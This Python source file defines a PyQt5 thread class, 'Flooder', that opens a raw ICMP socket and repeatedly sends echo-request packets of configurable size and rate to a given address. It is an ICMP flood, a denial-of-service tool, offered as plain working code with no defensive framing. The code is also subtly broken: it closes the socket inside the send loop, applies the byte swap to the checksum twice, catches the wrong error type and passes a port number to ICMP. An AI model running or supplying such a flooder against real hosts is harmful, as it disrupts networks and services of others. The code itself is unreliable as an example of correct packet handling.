from time import time, sleep
from struct import pack, error

from socket import (
    socket,
    htons,
    inet_aton,
    AF_INET,
    SOCK_RAW,
    IPPROTO_ICMP
)
from logging import warning, exception

from PyQt5 import QtCore
from PyQt5.QtCore import QThread


class Flooder(QThread):
    finish_signal = QtCore.pyqtSignal()

    def __init__(self, address: str, port_number: int, packet_length: int, sending_frequency: float):
        QThread.__init__(self, None)

        self.address = address
        self.port_number = port_number
        self.packet_length = packet_length
        self.sending_frequency = sending_frequency

    @staticmethod
    def _checksum(message) -> int:
        summary = 0
        for i in range(0, len(message), 2):
            w = message[i] + (message[i + 1] << 8)
            summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
        return htons(~summary & 0xffff)

    def _construct_packet(self):
        header = pack("bbHHh", 8, 0, 0, 1, 1)
        data = (self.packet_length - 50) * 'Q'
        data = pack("d", time()) + data.encode('ascii')
        header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
        return header + data

    def run(self) -> None:
        try:
            sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
            inet_aton(self.address)

            while True:
                packet = self._construct_packet()
                sock.sendto(packet, (self.address, self.port_number))
                sleep(self.sending_frequency)
                sock.close()

        except error as e:
            exception(msg=f'Error while pack: {e}')

        except (KeyboardInterrupt, SystemExit) as e:
            warning(msg=f'Has been interrupted closing event. Closing all available threads: {e}')
            return

        finally:
            self.finish_signal.emit()
